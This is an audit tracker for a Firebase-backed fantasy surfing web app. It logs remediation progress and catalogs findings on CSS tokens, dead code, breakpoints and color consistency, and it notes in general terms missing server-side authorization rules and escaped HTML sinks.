# Code-Organization & Hygiene Audit — Tracker

> **Status:** Open · **Generated:** 2026-06-17 · **Method:** multi-agent audit (10 dimensions, 86 findings, 80 falsifiable claims adversarially re-verified against the code).
> **Owner:** Blake · **Last reviewed:** 2026-06-17

## How to use this document

- This is the canonical, durable home for the codebase audit. Reference it periodically; chip away in small chunks.
- **§3 Roadmap** is the action surface — tick checkboxes as you go. **§5 Full catalog** is the evidence reference (every finding `F-NN` with file:line proof).
- When you finish an item, check its box in §3 and add a dated line to the **Progress log** below.
- Severity is honest, not inflated. Verdicts come from an independent verifier pass: ✅ verified · ⚠️ partial (with correction) · ❌ refuted (dropped).

### Progress log

- 2026-06-17 — Audit generated and committed to repo.
- 2026-06-17 — **Wave 0 (in-repo parts) done.** Authored `firestore.rules` / `storage.rules` / `firebase.json` / `firestore.indexes.json` / `.firebaserc` from the real data model. Added canonical `escapeHtml()`+`safeUrl()` to `js/ui.js` and escaped every user/remote `innerHTML` sink across all 10 pages + the live-status banner; avatar URLs validated on save. Added `test/security-helpers.test.mjs` (17/17 pass). Full repo passes `node --check`. Remaining Wave 0 items need Firebase access → see [firebase-deploy-handoff.md](firebase-deploy-handoff.md). Branch: `wave0-security-hardening`.
- 2026-06-17 — Wave 1 underway (config / color tokens / a11y / dead-code + batch-chunking). **writeBatch chunking (F-61):** added `commitInChunks` (retries transients, reports partial-write count, sets-before-deletes, idempotent re-run). Owner accepted the brief-but-recoverable partial window over reverting to a single atomic batch; the single-doc-per-tour leaderboard (fully atomic, no 500-op cap) is recorded in Wave 2 as the escape hatch if zero-partial-state or >500-user scale is later required.
- 2026-06-17 — **Wave 1 complete** (all 7 items) and pushed across 6 commits: config module, semantic color tokens, accessibility bundle, dead-code/asset cleanup, writeBatch chunking, themed danger confirm-modals + type-to-confirm. Node now installed; `test/security-helpers.test.mjs` green throughout. Up next: Wave 2 (structural refactors).
- 2026-06-17 — **Wave 2 started** (branch `wave2-refactors`). Chunk 1: deleted the orphan `data.html` instead of extracting a shared loader — `surfers.html` (Data Vault) already supersedes it and nothing links to `data.html`. Removed the F-44 duplication + ~600 dead lines; fixed the stale `ui.js` comment + a dead `.place-badge` inline rule in surfers.html.
- 2026-06-17 — **Wave 2 chunks 2–5** (committed separately): **(2)** unified the standings + club event-by-event leaderboard into `js/standings-table.js` — one component, `playerColWidth`-driven sticky offsets, a robust always-28px avatar (initial circle + photo overlay that self-removes on error), right-edge scroll-shadow affordance _(F-28/F-47)_. **(3)** simplified pricing: `pricing.js` imports cap/roster via `getTeamRules()`, the two-value `PRICING` table became `PEAK`+`POOL_FACTOR`, `MAX_VALUE` dropped _(F-21)_. **(4)** deduped `splitName`+`nameLabelHtml` into `ui.js` _(F-30)_. **(5)** extracted `buildRankProgression` into `scoring.js` so the dashboard + club rank sparklines share one helper (`user.uid` → `userId` param), and folded the thrice-written best-9-of-N rule into a single `bestNTotal` primitive that both it and `calculateSeasonStandings` call _(F-29)_. The two SVG chart renderers stay per-page by design (tall dashboard vs flat club pane). Each chunk verified as a no-op via a standalone equivalence test.

---

## 1. Overall verdict

The foundation is genuinely good — clean acyclic module graph (`firebase-config ← auth ← ui`; pure `scoring`/`team`/`pricing` import nothing), the leaderboard-recalc integrity contract matches its documentation, and hygiene is above average (zero TODO/FIXME, zero commented-out blocks, zero stray `console.log`). The debt is **accreted at the edges, not rotted at the core** — mostly mechanical: logic trapped in HTML, a semantic-color layer that was never built, and a season/tour config with no single home.

**The one disqualifying gap before monetization: there is no server-side authorization.** Every integrity rule (cap, roster, trading lock, admin status) lives only in client JS, and no `firestore.rules` exists in the repo. That single fact turns a carefully-guarded client into an open datastore. See **F-53 / F-60 / F-54**.

**Tally:** 2 critical · 14 high · 31 medium · 28 low · 11 info. Verification: 71 confirmed · 8 partial · 1 refuted.

---

## 2. Cross-cutting themes

These recur across dimensions and matter more than any single finding.

- **A — No server-side authorization** (the only critical theme). No `firestore.rules`/`firebase.json` in the repo; all guards are client-only and console-bypassable. → F-53, F-60, F-54, F-55, F-56
- **B — Business logic trapped in HTML, then copy-pasted.** Standings table, best-9 rule, sparkline, name helpers, roster strip all duplicated across 2–3 pages; `admin.html` is five tab-apps in one file. → F-28, F-44, F-29, F-47
- **C — The semantic-color layer was never built.** `--color-error` bypassed 26×; no `--color-success` token (5 greens); no warning/info tokens; `--font-mono` dead. → F-01, F-09, F-10, F-11
- **D — No single source of truth for SEASON or TOURS.** `SEASON` hardcoded in 8 HTML files + defaulted in 8 JS functions, but `ui.js` derives it via `getFullYear()` → split-brain on Jan 1. 183 bare `"mens"/"womens"` literals, no `TOURS`. → F-43, F-78, F-79
- **E — Unchunked Firestore batches.** 8 `writeBatch` sites commit without 500-op chunking — a silent scaling ceiling. → F-61
- **F — Accessibility gaps that are one-file fixes.** CTA contrast 2.48:1, `.text-muted` fails AA, no `:focus-visible` anywhere. → F-68, F-69

---

## 3. Roadmap (the small-chunks action surface)

### Wave 0 — Security & integrity (before any monetization; non-negotiable)

- [x] **Authored** `firestore.rules` + `firebase.json` + `storage.rules`: `teams` writes locked to `uid` + `tradingOpen==true`, `isAdmin` client-immutable, `surfers/events/results/leaderboard/config/meta` admin-only, `avatars/{uid}` scoped. _(F-53, F-60, F-56, F-55)_ → **deploy pending collaborator** ([firebase-deploy-handoff.md](firebase-deploy-handoff.md))
- [x] Promoted `escapeHtml` + `safeUrl` to `ui.js`; escaped every user/remote `innerHTML` sink across all pages; `avatarUrl` validated on save. _(F-54)_
- [x] `isAdmin` made client-immutable in `firestore.rules` (self-elevation closed). Custom-claims migration is optional/defense-in-depth → collaborator. _(F-56)_
- [ ] Restrict Firebase API key (HTTP-referrer) + enable App Check → **collaborator** (Console/GCP only)
- [x] Scraped `statusColor` validated to a hex pattern + live-status fields escaped in `renderLiveStatusBanner`. _(F-57)_

### Wave 1 — High-leverage quick wins (trivial/small effort, real payoff)

- [x] **`js/config.js`** exports `SEASON`/`BEST_N_EVENTS`/`TOURS`; removed 8 per-page `SEASON` redeclarations + the `=2026` defaults (db.js/wsl-scrape.js) + best-9 magic numbers; fixed the `ui.js` `getFullYear()` drift. _(F-43, F-78)_
- [x] Added semantic tokens (`--color-success`/`-bg`, `--color-error-bg`, `--color-warning`/`-bg`/`-border`); wired the dead `--color-error` (2→29 uses) + `--font-mono`; consolidated 5 greens / 4 reds / scattered golds. _(F-01, F-09, F-10, F-11)_ — *deferred:* `--color-info` (no distinct info color exists — `.toast--info` uses charcoal) and `--color-on-accent`/`#fff` (already one consistent value, not fragmented).
- [x] CTA → AA (5.26:1), `.text-muted` token → AA (5.65:1), `.footer-sub` fixed; global `:focus-visible` (component `:focus` guarded with `:not(:focus-visible)`); `role`/`aria-live` on toasts; `aria-label` on search inputs; `prefers-reduced-motion` block. _(F-68, F-69)_ — *left:* `.btn--secondary` terracotta (3.26:1, passes the 3:1 UI bar) + decorative warm-gray uses.
- [x] Chunked the 4 user-scaling `writeBatch` sites (clearAllTeams, carry-forward, lock, leaderboard recalc) via `commitInChunks` (sets-before-deletes; partial-write reporting + admin re-run prompt); structurally-bounded batches left as-is. Retry dropped per owner; single-doc-leaderboard escape hatch recorded in Wave 2. _(F-61)_
- [x] Replaced all 6 native `confirm()` with `confirmModal({confirmTone:'danger'})`; added optional `requireText` so Reset-All-Teams requires typing `RESET` (click/Enter/input all gated). _(F-64)_
- [x] Deleted `getCurrentUser`/`getUserProfile`, 186 lines of verified-dead CSS (28 selectors), 3 orphan `data/` files; fixed stale CLAUDE.md "Seed Data" + `SEASON` lines; rewrote the README. _(F-37, F-38)_ — *left:* the `uncertain` design-system CSS primitives (kept conservatively).
- [x] Compressed `loadpage.jpg` 3.6 MB → 612 KB (q90 JPEG, same dimensions). _(F-75)_ — *deferred:* a dedicated 1200×630 OG crop (the resized image serves as OG today).

### Wave 2 — Structural refactors (medium/large; sequence by payoff)

- [x] Extract shared `renderStandingsTable` (→ `js/standings-table.js`, sticky offsets via a `playerColWidth` param) + `buildRankProgression` + `bestNTotal` (→ `scoring.js`) _(F-28, F-29, F-47)_
- [x] ~~Extract `js/wsl-history.js` shared by data/surfers~~ → **Resolved by deletion (2026-06-17):** `data.html` was an unreachable orphan superseded by `surfers.html` (Data Vault) — deleted it (~600 lines), so the loader/indices have a single home and the F-44 duplication is gone; no shared module needed. _(F-44 + the data.html-orphan finding)_
- [ ] Lift `tourLabel` into `ui.js` — *done:* `splitName`+`nameLabelHtml` (`ui.js`), `avatarTile` (`standings-table.js`); `renderRankSparkline` **kept per-page** (dashboard chart is intentionally tall, club chart flat — only the `buildRankProgression` data is shared)
- [ ] Add a `bootstrapPage()` helper for the 8-page preamble
- [x] Have `pricing.js` consume cap/roster via `getTeamRules()` — done; the two-value `PRICING` table became `PEAK`+`POOL_FACTOR`, and `MAX_VALUE` was dropped (peak is the single ceiling) _(F-21)_
- [ ] Split `ui.js` (819 lines) into format/banners/modals/nav
- [ ] Decompose `admin.html` (1,913 inline lines) into per-tab controller modules — do last, incrementally

- [ ] **(Escape hatch / deferred 2026-06-17)** Restructure the leaderboard to one document per tour (`leaderboard/{season}_{tour}` holding the standings array): makes recalc a single atomic `setDoc` — never partial, no 500-op cap, cheaper reads (1 doc vs N), and drops the orphan-delete logic. Read paths unaffected if `getLeaderboard()` keeps its array shape. Chosen against (for now) in favor of chunked+retry per owner decision.

### Wave 3 — Nice-to-haves

- [ ] Deterministic tiebreak in `computeFinishPositions` (replace `Math.random()`)
- [ ] Consolidate duplicated countdown DHMS/timezone parsing + per-ticker interval handles
- [ ] `--color-terracotta-dark`; radius/spacing scale reconciliation; `<th scope>`; OG tags on `about.html`
- [ ] Collapse ~4 near-duplicate breakpoints onto canonical 768/1024 with a comment legend

### Out-of-scope follow-ups (operational readiness for a paid product)

These were *not* part of the static code-org audit but separate "hobby app → product" gaps surfaced by the completeness critique:

- [ ] **Testing:** add Node unit tests for the money-adjacent pure modules (`scoreTeam`, `projectTeam`, best-9, `buildCurve`) — no build step needed
- [ ] **CI / deploy safety:** GitHub Action to validate HTML/JS and `firebase deploy --only firestore:rules` (required to actually ship Wave 0 rules)
- [ ] **Dependency pinning:** pin Firebase CDN imports to exact patch + SRI integrity hashes
- [ ] **Read-quota modeling:** `getEvents` reads whole collection; `club.html` fans out N `getUser` calls — cost at scale
- [ ] **Observability:** client error capture (Sentry-class) + basic analytics — currently only 4 `console.warn/error` calls
- [ ] **WSL scrape resilience:** document the failure mode when WSL changes DOM markup mid-event

---

## 4. Verifier corrections (already reflected above — do NOT re-introduce)

- **❌ REFUTED:** "~19 unmanaged breakpoints." Actual: 13 `@media` across **7** values (768px already canonical). The count miscounted non-media `max-width` properties. Real cleanup ≈ 4 one-offs (info-severity).
- **⚠️ `--color-off-white` is NOT dead** — used as a `var()` fallback at about.html:73. Don't delete blindly.
- **⚠️ place-badge is NOT duplicated** — data/surfers share the *loader*, but `placeBadge()` renderers diverge intentionally (medals vs ranks). Extract the data layer only.
- **⚠️ `leaderboard-rank--3` is LIVE** (built dynamically at standings.html:132); the **drop button is already a native `<button>`** with `aria-label` (needs only a tap-target size bump).
- **⚠️ off-white/cream collision is small** — only admin.html's `#f7f5f0` is a true near-duplicate; keep the semantic-token rec, drop the "sweep duplicate literals" angle.

---

## 5. Full findings catalog

Every finding with evidence. `F-NN` references are stable; the roadmap above points back to these.


### CSS

#### F-01 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Semantic colors (success-green, error-red, white) are hardcoded ~30x instead of tokenized; --color-error is a dead token**

- **Category:** maintainability
- **Evidence:** css/fantasy.css:26 defines `--color-error: #c0392b;` but `var(--color-error)` appears 0 times, while the literal `#c0392b` appears 12 times (lines 359, 364-365, 414-415, 516, 808, 1147, 1457-458, 1475, 1696, 1707). Green has no token at all: `#217a3c` x6 + `#dff5e3` x4 (badges 401-411, toast 803, inline-select 1661-1672, toggle 1713). `#fff` is hardcoded x15 (.btn--primary 326, avatars 967/987/1021, toasts 805/808/812, alt-label 1391, drop-btn 1455/1475). Near-duplicate reds/greens compound it: error red surfaces as #c0392b, #fde8e4 (413), #fde2e2/#a02c2c (1675-76), #e6d5d3 (359); success green as #217a3c, #dff5e3, #2e7d32 (1142).
- **Impact:** A theme tweak to 'success green' or 'error red' requires a find-and-replace across ~18 scattered literals (with three near-duplicate shades to reconcile), and the one token that exists for it (--color-error) is silently ignored — so a future dev who edits the token gets no effect and is actively misled. This is the single biggest divergence between the stated design-system intent and the actual code.
- **Recommendation:** Add `--color-success: #217a3c; --color-success-bg: #dff5e3; --color-error-bg: #fde8e4; --color-on-accent: #fff;` to :root, then replace the literals with var() references. Reconcile #2e7d32/#fde2e2/#a02c2c into the canonical pair or add explicit '-soft' variants. Either wire up the existing --color-error or delete it. This is the highest-value cleanup.

#### F-02 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**~10 selector families are confirmed dead (never referenced in any HTML or JS)**

- **Category:** maintainability
- **Evidence:** Cross-checked every CSS class against all *.html + js/*.js via literal substring search (dynamic builders like `badge--${status}`, `toast--${type}`, `leaderboard-rank--${rank}`, `team-row__change--${dir}` were verified as LIVE and excluded). Confirmed zero usage: the price-delta family (css 1135-1148 .price-delta/.price-delta--up/--down — superseded by .team-row__change at team.html:367); the entire profile-widget family (1575-1624, 7 selectors); the team-strip / team-photo-strip family (1177-1220, ~7 selectors); surfer-row__country/__action/__info/__meta and surfer-row--alternate (583-607, 1101-1115); surfer-photo--empty (1062); plus dash-content-cap (1287, even comments say 'No-op'), grid--3 (297), grid--team (299), section-header (725), search-bar (611), btn--secondary (335), btn--icon (376), filter-select (636), form-textarea (687), text-sage (931), text-terracotta (932). leaderboard-rank--3 (749) is also unhit (only ranks 1-2 styled in practice).
- **Impact:** ~120+ lines of dead CSS that every maintainer has to read past and reason about (e.g. the profile-widget block has its own responsive @media at 1620). Dead selectors also make future global refactors riskier — you can't tell which rules are load-bearing without re-running this cross-check.
- **Recommendation:** Delete the confirmed-dead families. The profile-widget and team-strip blocks are the biggest wins (whole sections). Keep utility classes like grid--3/text-sage only if you consider them intentional 'API surface'; otherwise drop them — they're trivially re-addable.

#### F-03 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Responsive strategy is desktop-first with seven unrelated breakpoints and @media rules scattered across ~9 locations**

- **Category:** maintainability
- **Evidence:** The named '── Responsive ──' section (877-926) only holds the global 1024/768 breaks; component @media rules then appear independently at lines 1040, 1235, 1266, 1271, 1296, 1557, 1620, plus inside inline <style> blocks. Distinct responsive breakpoints codebase-wide: 1024 (css 879), 1000 (css 1266/1557), 900 (team.html style), 768 (css x5), 700 (surfers.html style), 600 (css 1296 + team.html), 420 (team.html). All use `max-width` (desktop-first). CLAUDE.md/MEMORY flag mobile-friendliness as a first-class objective, yet there's no shared breakpoint scale — 1000 vs 1024 and 900 vs 768 are arbitrary neighbors tuned per-component.
- **Impact:** Changing where the layout 'goes mobile' means hunting through 9+ disjoint @media blocks in two languages (CSS + inline). The 1000-vs-1024 and 900-vs-768 splits create awkward dead zones where one component reflows but its neighbor hasn't yet. No single source of truth for the responsive contract.
- **Recommendation:** Standardize on 2-3 breakpoints (e.g. 1024 tablet, 640 phone) and document them as the scale. CSS custom properties can't drive @media directly, but a code-comment 'breakpoint legend' at the top plus collapsing 1000->1024 and 900->768 would remove most of the drift. Keep per-component @media co-located with their component (that part is fine) but make them use the shared values.

#### F-04 · 🟡 MEDIUM · effort: small · _opinion (not falsifiable)_

**Stylesheet back-half (949-1872) has decayed into an append-only feature log, separate from its own design-system front-half**

- **Category:** maintainability
- **Evidence:** Section map (grep '── '): lines 6-948 are clean reusable primitives (Reset, Header, Cards, Grid, Buttons, Badges, Tables, Forms, Utility...). From 949 on it's chronological feature accretion: Avatars, Surfer Photos, Drag & Drop, 'Club leaderboard controls' (1228), 'Dashboard responsive grid' (1243), 'Dashboard header + subtitle' (1275), 'Single-row team display' (1300), 'Profile widget' (1574, dead), Inline Selects, Toggle, Modal, Confirm Modal. Several are single-page-specific (club-controls, dash-*) and read as 'where the last feature landed' rather than a system. Some carry 30-50 line prose comments (e.g. 1477-1494 on .team-row--editable) that explain pixel decisions inline.
- **Impact:** Discoverability drops sharply past line 950 — a new contributor can't predict where a rule lives, and page-specific rules (dash-*, club-controls) sit in the global sheet with no signal they're scoped to one page. This is why dead blocks (profile-widget, team-strip) accumulated unnoticed.
- **Recommendation:** Low-risk reorg, not a rewrite: add a short table-of-contents comment at the top, group the page-scoped sections under one '── Page-specific ──' banner, and move the two confirmed-dead families out. No need to split into multiple files (no bundler — extra requests aren't worth it for a static GH Pages site). The front-half organization is good and should be the model.

#### F-05 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Inline <style> blocks in 4 pages introduce a third color/breakpoint dialect that duplicates shared concepts**

- **Category:** maintainability
- **Evidence:** Inline <style> totals: team.html ~225 lines, data.html ~112, about.html ~91, surfers.html ~90. They add 25 more hex literals (team 8, data 14, about 2, surfers 1) including yet more semantic greens/reds: team.html `.surfer-row--selected { border:2px solid #3a6b1f; background:#d6ebca }` and `.btn--unaffordable { ...#c0392b }` (a 3rd green + re-hardcoded error red). data.html invents a full `.place-1..place-33` palette (#f5d060/#5a4200, #d0d5dd, #c8e6c9/#1b5e20, #fce4ec/#880e4f...) entirely outside the token system. They also add breakpoints 900/600/420 (team) and 700 (surfers) not present in the shared sheet. .athlete-grid (team.html) is a reusable grid pattern living inline.
- **Impact:** The 'design system' is actually three systems (fantasy.css tokens + per-page inline colors + per-page inline breakpoints). A surfer 'selected' green or 'unaffordable' red can't be retheme-d from one place. Genuinely reusable patterns (.athlete-grid, .place-badge palette) are trapped on single pages and can't be shared.
- **Recommendation:** Promote the cross-cutting bits (.surfer-row--selected/--unaffordable, .athlete-grid, the .place-* result palette which data.html and any future results view both want) into fantasy.css using tokens. Truly one-off layout tweaks can stay inline, but anything with a color literal or a breakpoint should move to the shared sheet so the token/breakpoint scales stay authoritative.

#### F-06 · 🔵 LOW · effort: small · ⚠️ partial (high conf.)

**Radius and shadow tokens are bypassed by magic literals; --radius-lg / --color-off-white tokens are effectively dead**

- **Category:** maintainability
- **Evidence:** Tokens are --radius-sm/md/lg = 2/4/8px, yet literals appear: border-radius 6px (182, 1800, 1829), 10px (1328, 1543), 3px (1139), 8px (1549), 2px (244 — equals --radius-sm). --radius-lg is referenced only once and defensively (`var(--radius-lg, 12px)` at 1739) — odd, since the token IS defined as 8px, so the 12px fallback never fires and signals the author wasn't sure it existed. --color-off-white (#f8f7f4, line 27) has 0 var() refs and its literal never appears in the body. box-shadow literals bypass --shadow-sm/md too: `0 1px 4px rgba(0,0,0,0.06)` (1333), `0 8px 32px rgba(0,0,0,0.2)` (1745).
- **Impact:** Corner-radius and elevation drift: 6px/10px/3px ad-hoc radii sit alongside the 2/4/8 scale, so 'roundedness' is inconsistent across components by accident, not design. Dead tokens (--radius-lg practically, --color-off-white fully) mislead.
- **Recommendation:** Either extend the radius scale (add --radius-pill:100px which is already hardcoded ~6x, and a --radius-xl if 10-12px is intentional for tiles/modals) and use it, or accept the literals and drop the unused tokens. Fix the `var(--radius-lg, 12px)` fallback to match the 8px token (or change the token to 12px if that's the intended modal radius). Delete --color-off-white.
- **⚠️ Verifier correction:** Radius/shadow portion fully accurate. Correction: --color-off-white (#f8f7f4, css/fantasy.css:27) is NOT dead — it is referenced at about.html:73 via `background: var(--color-off-white, #f8f7f4)`. It has 0 var() refs only within fantasy.css. The recommendation should be amended: do not delete it (or, if deleted, also update about.html:73 to the literal). The radius-literal cleanup and the `var(--radius-lg, 12px)` -> `var(--radius-lg)` (or token-to-12px) fix remain valid. Also: `border-radius: 100px` appears 5x (not ~6x), still enough to justify a --radius-pill token if pursued.

#### F-07 · 🔵 LOW · effort: trivial · ⚠️ partial (high conf.)

**Heavy reliance on !important for drag/drop state and a redundant --color-dark alias**

- **Category:** maintainability
- **Evidence:** `!important` is used to win specificity battles on drag feedback: .surfer-row--drag-over (1129) `background ... !important`, .drop-zone--over (1222-1224) three !importants. These exist because the base .surfer-row/.team-row rules out-specify the state modifier. Separately, --color-dark is a pure alias of --color-charcoal (line 25 `--color-dark: var(--color-charcoal)`) used only 3x vs charcoal's 21x — two token names for one value (tour-tab uses --color-dark, everything else --color-charcoal).
- **Impact:** Minor but real: !important is a code smell that makes future state styles (e.g. a combined drag+selected state) hard to compose, and the two-name-one-color situation means a reader must know they're identical. Neither is urgent.
- **Recommendation:** The !important is defensible given inline drag styles also fight it — leave it unless you refactor drag state. Consider collapsing --color-dark into --color-charcoal (or document it as a deliberate semantic alias) so there's one canonical name. Fine to defer.
- **⚠️ Verifier correction:** .drop-zone--over (css/fantasy.css:1221-1226) has TWO !important declarations, not three: line 1222 `background: rgba(156, 168, 152, 0.1) !important;` and line 1223 `border-color: var(--color-sage) !important;`. Line 1224 `outline: 2px dashed var(--color-sage);` carries no !important. Total !important in the file is 4 (verified by grep -c): line 1047 `.hidden`, 1129 `.surfer-row--drag-over`, 1222, 1223. So drag/drop state accounts for 3 of 4 !important uses. Everything else in the claim is exact: --color-dark is a #2F2F2F alias of --color-charcoal (def at line 25), used 3x in the stylesheet (1169/1171/1214) vs charcoal's 21 var-refs; the specificity rationale holds because base .surfer-row:hover (546) and .surfer-row[draggable] (1119) out-specify the .surfer-row--drag-over modifier.

#### F-08 · ⚪ INFO · effort: trivial · _opinion (not falsifiable)_

**Front-half design system, token discipline where used, and the single-file decision are genuinely solid**

- **Category:** design
- **Evidence:** Lines 14-61 define a thoughtful token set with explanatory comments (the --max-width 984=920+2*32 math at 40-43 is exactly the kind of magic-number documentation reviewers wish for). BEM-style naming is consistent (.card__header, .surfer-row__name, .btn--primary). Heavily-used tokens prove the system isn't decorative: --color-beige 34x, --color-warm-brown 29x, --color-sage 26x, --radius-md 10x. The athlete-tile tokens (--athlete-tile-fill/border/photo-focus, 45-60) correctly enforce 'pool tile and roster tile must stay identical' from one source — exactly the right use of a token.
- **Impact:** Establishes that the debt above is localized accretion, not a broken foundation. The fixes are additive (tokenize the gaps, prune the dead blocks), not a rewrite.
- **Recommendation:** No change for its own sake. Keep the single stylesheet (correct for a no-build GH Pages site — splitting adds requests with no upside). Treat the front-half token discipline as the standard the back-half and inline blocks should be brought up to.


### Design Tokens

#### F-09 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**--color-error token defined but bypassed: #c0392b hardcoded 26 times across the repo**

- **Category:** color-tokens
- **Evidence:** css/fantasy.css:26 defines `--color-error: #c0392b;` yet the literal `#c0392b` appears 26 times (CSS:358,362,364,414,515,807,1146,1456-57,1475,1696; admin.html:399,1795,1830; team.html:26-27,195,197,583; standings via others; index/data variants) while `var(--color-error)` is used only twice — both in club.html:361 (`var(--color-error,#c0392b)`). grep counts: literal=26, var()=2.
- **Impact:** The token exists to be the single source of truth for the brand error red, but 26 hardcoded copies mean a palette change requires a find/replace across 4 file types (CSS, inline <style>, inline style=, JS template strings) instead of one edit. New code keeps copying the literal because the token isn't visibly in use. This is the literal definition of an unused/ineffective design token.
- **Recommendation:** Replace every `#c0392b` with `var(--color-error)` in CSS and inline styles. For JS-injected strings (admin.html template literals) either use `var(--color-error)` (works in inline style attributes) or a class. Keep the club.html fallback pattern only if supporting environments without :root, otherwise drop the `,#c0392b` fallback.

#### F-10 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Five different greens express the same success/positive/live/up semantic**

- **Category:** color-tokens
- **Evidence:** Same meaning, five values: #217a3c rgb(33,122,60) is the CSS success green (badges live/open css:402,410, toast--success css:803, toggle-on css:1713, inline-status css:1662/1672); #2e7d32 rgb(46,125,50) is price-delta--up (css:1142); #1a7f37 rgb(26,127,55) is admin repricing positive change (admin.html:1815,1851); #27ae60 rgb(39,174,96) is team.html overlay add btn (team.html:194); #3a6b1f rgb(58,107,31) is team.html .editable border (team.html:15). Also two tint backgrounds disagree: ui.js:247 live banner uses `rgba(33,122,60,0.12)` (=#217a3c) while css:1143 price-delta-up bg uses `rgba(46,125,50,0.1)` (=#2e7d32).
- **Impact:** There is no canonical 'positive/success' color, so live badges, price-up indicators, the trading toggle, and the team add-button all read as slightly different greens. The two tint backgrounds for the same 'success at low opacity' concept come from different base hues, so banners and price chips don't visually rhyme. Any future success state will pick yet another green.
- **Recommendation:** Introduce `--color-success: #217a3c` (the dominant one) and `--color-success-bg` (its consistent tint, e.g. rgba(33,122,60,0.12)). Repoint all five greens and both tint backgrounds to these. #27ae60/#1a7f37/#3a6b1f are brighter/web-default greens that clash with the muted Japandi palette and should fold into #217a3c.

#### F-11 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**No semantic tokens for warning/info states; a third 'error' amber (#b45309) lives only in JS**

- **Category:** color-tokens
- **Evidence:** There is no `--color-warning` or `--color-info` token at all. Warning amber is hardcoded across files with mutually inconsistent values: admin.html:1344/1835 warning panels use bg `#fff4dc` + border `#f0d68c` + text `#a37500`/`#7a5500`; css:996-998 ads-coin-badge uses bg `#fff8e1` + border `#f0d060` + text `#b8860b`; auth/form errors in js/auth.js:44, js/ui.js:759,812 use `#b45309` — an amber used as an ERROR color, a third distinct 'error' hue alongside #c0392b and #a02c2c. Info blue exists once (index.html:181 `#dc2626` red countdown is actually error; true info blue `#2471a3` only at standings? — info has no home).
- **Impact:** Warning and info are first-class UI states (admin validation panels, auth errors, coin badges) but have zero token coverage, so every instance invents bg/border/text triples that don't match each other. Worse, auth errors render in amber (#b45309) while all other errors are red — users see two different 'something went wrong' colors with no rationale.
- **Recommendation:** Add `--color-warning`, `--color-warning-bg`, `--color-info`, `--color-info-bg` (plus `--color-success`/`--color-success-bg` from the green finding). Standardize the warning panel triple (e.g. bg #fff8e1, border #f0d060, text #b8860b) into those tokens. Decide whether auth/form errors are 'error' (red) or 'warning' (amber) and use the matching token — the current amber-for-errors is likely a mistake.

#### F-12 · 🟡 MEDIUM · effort: trivial · ✅ verified (high conf.)

**--font-mono token is dead (zero references) and reimplemented inline with a different stack**

- **Category:** typography-tokens
- **Evidence:** css/fantasy.css:31 defines `--font-mono: 'SF Mono', Monaco, Consolas, monospace;` but `var(--font-mono)` has 0 references anywhere (repo-wide grep). Meanwhile admin.html:373 hardcodes a DIFFERENT mono stack inline: `font-family:ui-monospace,SFMono-Regular,Menlo,monospace`. Numeric/tabular needs are met ad hoc via `font-variant-numeric:tabular-nums` (index.html:181) rather than the token.
- **Impact:** A defined token that nothing uses is dead weight, and the one place that wants monospace ignored it and invented a competing stack — so the two would never match if the token were ever adopted. Confirms the token layer and the actual code drifted apart.
- **Recommendation:** Either delete `--font-mono` if monospace is genuinely a one-off, or (better) reconcile it to the modern `ui-monospace, SFMono-Regular, Menlo, monospace` stack and apply `var(--font-mono)` at admin.html:373 and any tabular-number contexts. Pick one.

#### F-13 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Reds for error/danger/locked/injured fragment into 4+ values across tours of the app**

- **Category:** color-tokens
- **Evidence:** Besides #c0392b: surfer-status 'injured' uses #a02c2c text on #fde2e2 bg (css:1675-76) while badge--locked uses #c0392b on #fde8e4 (css:413-14) — two different red+pink pairs for adjacent 'bad state' semantics; index.html:181 lock countdown uses an entirely separate red system bg #fef2f2 / text #dc2626 / border #fecaca (Tailwind reds); data.html:31 injured place uses bg #5c1a1a / text #ff6b6b. team.html:671 INJ stamp uses `rgba(200,30,30,0.85)` — yet another red.
- **Impact:** The danger/error family has no canonical base or tint scale, so locked badges, injured surfers, the countdown chip, and the INJ stamp are visibly different reds. The #fde2e2 vs #fde8e4 backgrounds are near-identical pinks doing the same job but won't match if either is tweaked.
- **Recommendation:** Once `--color-error` is the canonical red, derive `--color-error-bg` (one tint, e.g. #fde8e4) and use it for both badge--locked and injured backgrounds; consolidate the index.html countdown chip and team.html INJ stamp onto the same base. Drop #a02c2c, #dc2626, and the rgba(200,30,30) in favor of #c0392b at the appropriate opacity.

#### F-14 · 🟡 MEDIUM · effort: small · ⚠️ partial (high conf.)

**Three+ near-identical off-white/cream backgrounds; #f7f5f0 collides with --color-cream**

- **Category:** color-tokens
- **Evidence:** `--color-cream` is #F7F5F2 rgb(247,245,242); admin.html uses #f7f5f0 rgb(247,245,240) five times (admin.html:373,1335,1848,1853,1867) as panel/header backgrounds — differs from the cream token by 2 in the blue channel only, effectively the same color but not the token. Separately #fefdfb (=--color-warm-white) and #f8f7f4 (=--color-off-white) are each hardcoded once in CSS instead of using their own tokens. Plain `#fff` is hardcoded 32 times where --color-warm-white would usually be the intended surface.
- **Impact:** Panels in the admin tool sit on a one-shade-off cream that should just be `var(--color-cream)`; the 2-unit blue difference is imperceptible but means a cream retune leaves admin panels stranded. The pattern of hardcoding a token's own value (#fefdfb, #f8f7f4) shows authors didn't realize a token already existed.
- **Recommendation:** Replace admin.html #f7f5f0 with `var(--color-cream)`, and the CSS #fefdfb/#f8f7f4 literals with their tokens. Audit the 32 `#fff` uses: pure-white surfaces that should match the app background should be `var(--color-warm-white)`; only true white-on-colored-fill (toast text, badge text on green/red) should stay #fff (or become an `--color-on-accent` token).
